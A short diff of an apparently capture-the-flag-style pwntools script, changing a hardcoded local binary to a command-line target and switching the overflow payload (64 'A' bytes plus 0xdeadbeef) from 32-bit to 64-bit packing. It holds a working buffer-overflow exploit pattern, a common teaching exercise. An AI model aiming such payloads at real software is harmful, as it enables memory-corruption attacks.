@@ -7,6 +7,6 @@ if len(sys.argv) == 1:
 else:
     target = sys.argv[1]
 
-p = process("./memory_corruption")
-p.sendline("A" * 64 + p32(0xdeadbeef))
-print p.recv()
+p = process(target)
+p.sendline("A" * 64 + p64(0xdeadbeef))
+print p.read()
